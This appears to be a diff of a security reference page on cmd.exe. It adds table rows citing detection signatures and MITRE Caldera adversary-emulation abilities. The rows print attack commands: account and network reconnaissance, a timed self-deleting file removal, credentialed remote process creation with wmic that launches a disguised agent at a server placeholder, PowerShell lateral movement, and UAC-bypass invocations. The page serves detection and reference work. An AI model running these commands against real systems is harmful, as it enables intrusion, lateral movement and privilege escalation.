       <td><a href="https://github.com/eset/malware-ioc">malware-ioc</a></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/nukesped_lazarus/README.adoc">nukesped_lazarus</a></td>
-      <td><code class="language-plaintext highlighter-rouge">==== cmd.exe /c %s &gt;&gt; %s 2&gt;&amp;1</code></td>
+      <td><code class="language-plaintext highlight language-cmhg highlighter-rouge"><span class="err">====</span> <span class="ni">cmd</span><span class="err">.</span><span class="ni">exe</span> <span class="p">/</span><span class="err">c</span> <span class="err">%s</span> <span class="err">&gt;&gt;</span> <span class="err">%s</span> <span class="m">2</span><span class="err">&gt;</span><span class="mh">&amp;1</span></code></td>
       <td><a href="https://github.com/eset/malware-ioc/blob/master/LICENSE">© ESET 2014-2018</a></td>
     </tr>
     <tr>
@@ -2609,6 +2615,60 @@
       <td>$s1 = “Call oScript.Run ("cmd.exe /c " &amp; szCMD &amp; " &gt; " &amp; szTempFile, 0, True)”</td>
       <td><a href="https://github.com/Neo23x0/signature-base/blob/master/LICENSE">CC BY-NC 4.0</a></td>
     </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml">55678719-e76e-4df9-92aa-10655bbd1cf4.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="na">name</span><span class="pi">:</span> <span class="s">cmd.exe information gathering</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml">55678719-e76e-4df9-92aa-10655bbd1cf4.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">cmd.exe /c "net user" &gt;&gt; C:\Windows\temp\history.log;</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml">55678719-e76e-4df9-92aa-10655bbd1cf4.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">cmd.exe /c "whoami /priv" &gt;&gt; C:\Windows\temp\history.log;</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/collection/55678719-e76e-4df9-92aa-10655bbd1cf4.yml">55678719-e76e-4df9-92aa-10655bbd1cf4.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">cmd.exe /c "netstat -ano" &gt;&gt; C:\Windows\temp\history.log;</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/defense-evasion/5f844ac9-5f24-4196-a70d-17f0bd44a934.yml">5f844ac9-5f24-4196-a70d-17f0bd44a934.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Commandline = 'cmd.exe /c "timeout /nobreak /t 10 &gt;nul 2&gt;nul &amp; del /f</span> <span class="c1">#{location}"';</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/execution/2a32e46f-5346-45d3-9475-52b857c05342.yml">2a32e46f-5346-45d3-9475-52b857c05342.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server</span> <span class="c1">#{server}";</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/lateral-movement/41bb2b7a-75af-49fd-bd15-6c827df25921.yml">41bb2b7a-75af-49fd-bd15-6c827df25921.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">Invoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\Users\Public\svchost.exe -server</span> <span class="c1">#{server} } };</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/95ad5d69-563e-477b-802b-4855bfb3be09.yml">95ad5d69-563e-477b-802b-4855bfb3be09.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">.\Akagi64.exe 30 C:\Windows\System32\cmd.exe</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/mitre/stockpile">stockpile</a></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/data/abilities/privilege-escalation/b7344901-0b02-4ead-baf6-e3f629ed545f.yml">b7344901-0b02-4ead-baf6-e3f629ed545f.yml</a></td>
+      <td><code class="language-plaintext highlight language-yaml highlighter-rouge"><span class="s">.\Akagi64.exe 45 C:\Windows\System32\cmd.exe</span></code></td>
+      <td><a href="https://github.com/mitre/stockpile/blob/master/LICENSE">Apache-2.0</a></td>
+    </tr>
   </tbody>
 </table>
 
@@ -2997,7 +3057,7 @@ Incorrectly editing the registry may severely damage your system. Before making 
 
 <hr />
 
-<p>MIT License. Copyright (c) 2020 Strontic.</p>
+<p>MIT License. Copyright (c) 2020-2021 Strontic.</p>
 
 
     </section>
